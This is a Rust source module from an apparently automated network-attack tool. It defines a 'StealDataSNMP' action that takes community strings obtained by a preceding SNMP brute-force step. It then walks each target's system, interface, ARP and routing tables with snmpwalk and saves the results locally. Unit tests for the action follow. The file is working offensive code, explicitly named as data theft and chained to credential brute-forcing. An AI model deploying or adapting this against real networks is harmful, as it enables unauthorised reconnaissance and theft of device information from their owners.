use std::sync::Arc;
use std::time::Duration;

use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Steal device information via SNMP using discovered community strings.
/// Walks common OID subtrees: system, interfaces, ARP, routes.
/// Parent: SNMPBruteforce.
pub struct StealDataSnmp;

impl Action for StealDataSnmp {
    fn name(&self) -> &'static str {
        "StealDataSNMP"
    }
    fn port(&self) -> Option<u16> {
        Some(161)
    }
    fn parent(&self) -> Option<&'static str> {
        Some("SNMPBruteforce")
    }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "snmp").await;
    if creds.is_empty() {
        return ActionOutcome::Failed("no community strings".to_string());
    }

    let local_dir = build_output_dir(state, "snmp", &target.mac_address, &target.ip);
    let _ = tokio::fs::create_dir_all(&local_dir).await;

    // SNMP community strings are stored as "password" (user is empty)
    for (_user, community) in &creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        let result = timeout(Duration::from_secs(60), async {
            walk_snmp(&target.ip, community, &local_dir).await
        })
        .await;

        match result {
            Ok(Ok(count)) if count > 0 => {
                tracing::info!(ip = %target.ip, oids = count, "SNMP data collected");
                return ActionOutcome::Success;
            }
            _ => {}
        }
    }

    ActionOutcome::Failed("no SNMP data collected".to_string())
}

/// OID subtrees to walk.
const WALK_OIDS: &[(&str, &str)] = &[
    ("1.3.6.1.2.1.1", "system"),       // sysDescr, sysName, sysLocation, etc.
    ("1.3.6.1.2.1.2.2", "interfaces"), // Interface table
    ("1.3.6.1.2.1.4.22", "arp_table"), // ARP cache
    ("1.3.6.1.2.1.4.21", "routes"),    // IP route table
];

async fn walk_snmp(
    ip: &str,
    community: &str,
    local_dir: &std::path::Path,
) -> Result<usize, String> {
    let mut total = 0;

    for (oid, name) in WALK_OIDS {
        let output = tokio::process::Command::new("snmpwalk")
            .args([
                "-v2c", "-c", community, "-OQ", // Quick print
                ip, oid,
            ])
            .output()
            .await
            .map_err(|e| e.to_string())?;

        if output.status.success() {
            let content = String::from_utf8_lossy(&output.stdout);
            if !content.trim().is_empty() {
                let file_path = local_dir.join(format!("{name}.txt"));
                let _ = tokio::fs::write(&file_path, content.as_bytes()).await;
                total += content.lines().count();
            }
        }
    }

    Ok(total)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn action_name() {
        let action = StealDataSnmp;
        assert_eq!(action.name(), "StealDataSNMP");
    }

    #[test]
    fn action_port() {
        let action = StealDataSnmp;
        assert_eq!(action.port(), Some(161));
    }

    #[test]
    fn action_parent() {
        let action = StealDataSnmp;
        assert_eq!(action.parent(), Some("SNMPBruteforce"));
    }

    #[test]
    fn walk_oids_has_expected_subtrees() {
        assert!(!WALK_OIDS.is_empty());
        let names: Vec<&str> = WALK_OIDS.iter().map(|(_, name)| *name).collect();
        assert!(names.contains(&"system"));
        assert!(names.contains(&"interfaces"));
        assert!(names.contains(&"arp_table"));
        assert!(names.contains(&"routes"));
    }

    #[test]
    fn walk_oids_have_valid_oid_prefixes() {
        for (oid, _) in WALK_OIDS {
            assert!(
                oid.starts_with("1.3.6.1"),
                "OID {oid} should start with 1.3.6.1"
            );
        }
    }
}
